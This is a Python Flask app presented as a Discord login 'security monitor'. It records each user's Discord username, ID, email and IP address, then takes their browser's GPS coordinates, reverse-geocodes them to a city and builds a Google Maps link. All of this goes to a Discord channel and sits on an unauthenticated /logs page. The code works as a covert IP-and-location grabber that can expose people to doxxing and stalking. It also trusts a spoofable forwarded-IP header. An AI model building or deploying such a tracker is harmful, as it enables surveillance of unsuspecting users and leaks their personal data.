from flask import Flask, request, render_template, jsonify
import requests, json, os, threading
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot
from urllib.parse import quote

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")

# ----------------- IP取得 -----------------
def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

# ----------------- ログ保存 -----------------
def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    if discord_id not in logs:
        logs[discord_id] = {"history": []}
    data["timestamp"] = now
    logs[discord_id]["history"].append(data)
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

# ----------------- Flask ルート -----------------
@app.route("/")
def index():
    redirect_uri_encoded = quote(REDIRECT_URI, safe='')
    scopes = "identify email connections guilds"
    scopes_encoded = quote(scopes, safe='')
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={DISCORD_CLIENT_ID}"
        f"&response_type=code"
        f"&redirect_uri={redirect_uri_encoded}"
        f"&scope={scopes_encoded}"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    scopes = "identify email connections guilds"
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": scopes
    }

    try:
        res = requests.post(token_url, data=data, headers=headers)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()

    # IP取得
    ip = get_client_ip()
    if ip.startswith(("127.", "10.", "192.", "172.")):
        ip = requests.get("https://api.ipify.org").text

    # ログデータ初期化
    data_log = {
        "username": user.get("username"),
        "discriminator": user.get("discriminator"),
        "id": user.get("id"),
        "email": user.get("email"),
        "ip": ip,
        "region": "不明",
        "city": "不明",
        "lat": None,
        "lon": None,
        "timezone": "不明",
        "map_link": None
    }

    save_log(user["id"], data_log)

    return render_template("welcome.html", username=data_log["username"], discriminator=data_log["discriminator"], user_id=data_log["id"])

# ----------------- ブラウザ位置情報受信 -----------------
@app.route("/submit_location", methods=["POST"])
def submit_location():
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")
    user_id = data.get("user_id")

    if not lat or not lon or not user_id:
        return jsonify({"error": "緯度経度またはユーザーIDがありません"}), 400

    # 逆ジオコーディングで県・市を取得
    try:
        res = requests.get(
            f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}&accept-language=ja"
        ).json()
        address = res.get("address", {})
        region = address.get("state", "不明")
        city = address.get("city", address.get("town", address.get("village", "不明")))
    except:
        region, city = "不明", "不明"

    # Google Mapリンク
    map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"

    # 保存
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    if user_id not in logs:
        logs[user_id] = {"history": []}
    logs[user_id]["history"][-1].update({
        "region": region,
        "city": city,
        "lat": lat,
        "lon": lon,
        "map_link": map_link
    })
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

    # Discord Embed送信
    try:
        embed_data = {
            "title": "🔐 セキュリティログ通知",
            "color": 0x2B2D31,
            "description": f"""
```ini
[ ユーザー ]
{logs[user_id]['history'][-1]['username']}#{logs[user_id]['history'][-1]['discriminator']}
ID={user_id}
Email={logs[user_id]['history'][-1]['email']}
IP={logs[user_id]['history'][-1]['ip']}
Region={region}/{city}
緯度/経度={lat},{lon}
Google Map={map_link}
```""",
            "footer": {"text": "BLACK_ルアン セキュリティモニター"},
            "timestamp": datetime.utcnow().isoformat()
        }
        bot.loop.create_task(bot.send_log(embed=embed_data))
    except Exception as e:
        print("Embed送信エラー:", e)

    return jsonify({"status": "ok"})

# ----------------- ログ表示 -----------------
@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    return render_template("logs.html", logs=logs)

# ----------------- Bot起動 -----------------
def run_bot():
    bot.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
